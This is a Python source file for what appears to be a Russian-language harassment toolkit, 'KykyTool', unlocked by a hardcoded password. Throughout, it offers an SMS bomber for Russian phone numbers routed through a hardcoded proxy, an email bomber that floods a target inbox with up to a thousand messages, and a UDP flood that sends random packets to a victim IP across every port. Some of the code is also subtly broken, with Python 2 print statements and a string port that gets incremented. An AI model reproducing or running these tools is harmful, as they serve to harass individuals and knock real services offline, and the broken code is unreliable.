import requests
import services
import smtplib
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
# Variables
dev = 'ProstoMobik' # Переменная для определения разработчика
pyver = '3.11'
ver = '1.0'
# Colors
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
# Welcome
print('Добро пожаловать в KykyTool')
nick = input('Выберите никнейм, чтобы было проще обращатся: ')
passw = input('Введите пароль: ')
# Password
if passw == 'kykyteam':
    print('Добро пожаловать!\nРазработано:', dev, '\nНик:', nick, '\nВерсия', ver, '\nPython: ', pyver)
    while True:
        # commands
        cmd = input('> ')
        if cmd == 'info': # INFO
            print('Информация:\nРазработано:' , dev , '\nВерсия:' , ver)
        if cmd == 'bomb': # BOMB
            # inputs
            print('Введите номер без префикса (+7) (8)\nПример: 9018017010')
            input_number = input(green + bold + ">> " + end)
            print('Сколько сообщений отправить?')
            sms = int(input(green + bold + ">> " + end))

            print(f"Вам нужен {cyan} tor {end}y/n? ")
            is_tor = input(bold + green + ">> " + end)


            def parse_number(number):
                msg = f"[*]Проверка номера - {green}{bold}OK{end}"
                if len(number) in (10, 11, 12):
                    if number[0] == "8":
                        number = number[1:]
                        print(msg)
                    elif number[:2] == "+7":
                        number = number[2:]
                        print(msg)
                    elif int(len(number)) == 10 and number[0] == 9:
                        print(msg)
                else:
                    print(
                        f"[*]Проверка номера - {red}{bold}Проблема с номером!{end}\nБомбер работает пока что только на русских номерах")
                    quit()
                return number


            number = parse_number(input_number)

            # tor
            if str(is_tor) == "y":
                print(f"[*]Запуск {cyan}{bold}Tor{end}...")
                proxies = {
                    'http': 'socks5://139.59.53.105:1080',
                    'https': 'socks5://139.59.53.105:1080'
                }
                tor = requests.get('http://icanhazip.com/', proxies=proxies).text
                tor = (tor.replace('\n', ''))
                print(f"[*]launch {cyan}{bold}Tor{end} - {green}{bold}OK{end}")

            services.attack(number, sms)
        if cmd == 'emailbomb': # Бомбер для почты
            class Email_Bomber:
                count = 0

                def __init__(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Иницализируем программу. ]+]+]+')
                        self.target = str(input(bcolors.GREEN + 'Введите почту цели <: '))
                        self.mode = int(input(
                            bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                        if int(self.mode) > int(4) or int(self.mode) < int(1):
                            print('ERROR: Опция неправильна, пошел в пизду')
                            sys.exit(1)
                    except Exception as e:
                        print(f'Ошибочка братан: {e}')

                def bomb(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Устанавилваем бомбу C4 в школе жертвы... ]+]+]+')
                        self.amount = None
                        if self.mode == int(1):
                            self.amount = int(1000)
                        elif self.mode == int(2):
                            self.amount = int(500)
                        elif self.mode == int(3):
                            self.amount = int(250)
                        else:
                            self.amount = int(input(bcolors.GREEN + 'Выберите сумму <: '))
                        print(
                            bcolors.RED + f'\n+[+[+[ Вы выбрали режим: {self.mode} and {self.amount} почт ]+]+]+')
                    except Exception as e:
                        print(f'ERROR: {e}')

                def email(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Устанавливаем почту ]+]+]+')
                        self.server = str(input(
                            bcolors.GREEN + 'Введите сервер Email | или выберите опцию - 1:Gmail 2:Yahoo 3:Outlook <: '))
                        premade = ['1', '2', '3']
                        default_port = True
                        if self.server not in premade:
                            default_port = False
                            self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

                        if default_port == True:
                            self.port = int(587)

                        if self.server == '1':
                            self.server = 'smtp.gmail.com'
                        elif self.server == '2':
                            self.server = 'smtp.mail.yahoo.com'
                        elif self.server == '3':
                            self.server = 'smtp-mail.outlook.com'

                        self.fromAddr = str(input(bcolors.GREEN + 'Введите адресс <: '))
                        self.fromPwd = str(input(bcolors.GREEN + 'Введите пароль <: '))
                        self.subject = str(input(bcolors.GREEN + 'Введите тему <: '))
                        self.message = str(input(bcolors.GREEN + 'Введите сообщение <: '))

                        self.msg = '''От: %s\nК: %s\nТема %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

                        self.s = smtplib.SMTP(self.server, self.port)
                        self.s.ehlo()
                        self.s.starttls()
                        self.s.ehlo()
                        self.s.login(self.fromAddr, self.fromPwd)
                    except Exception as e:
                        print(f'Ошибка: {e}')

                def send(self):
                    try:
                        self.s.sendmail(self.fromAddr, self.target, self.msg)
                        self.count += 1
                        print(bcolors.YELLOW + f'Бомба: {self.count}')
                    except Exception as e:
                        print(f'ERROR: {e}')

                def attack(self):
                    print(bcolors.RED + '\n+[+[+[ Атакуем... ]+]+]+')
                    for email in range(self.amount + 1):
                        self.send()
                    self.s.close()
                    print(bcolors.RED + '\n+[+[+[ Атака завершена ]+]+]+')
                    sys.exit(0)



            if __name__ == '__main__':
                bomb = Email_Bomber()
                bomb.bomb()
                bomb.email()
                bomb.attack()
        if cmd == 'ddos':
            os.system("clear")
            os.system("figlet DDos Attack")
            print
            ip = input("IP жертвы : ")
            port = input("Порт       : ")

            os.system("clear")
            os.system("figlet Attack Starting")
            print
            "[                    ] 0% "
            time.sleep(5)
            print
            "[=====               ] 25%"
            time.sleep(5)
            print
            "[==========          ] 50%"
            time.sleep(5)
            print
            "[===============     ] 75%"
            time.sleep(5)
            print
            "[====================] 100%"
            time.sleep(3)
            sent = 0
            while True:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                port = port + 1
                print
                "Отправлено %s пакетов to %s на порт:%s" % (sent, ip, port)
                if port == 65534:
                    port = 1
else:
    print('Неправильный пароль!')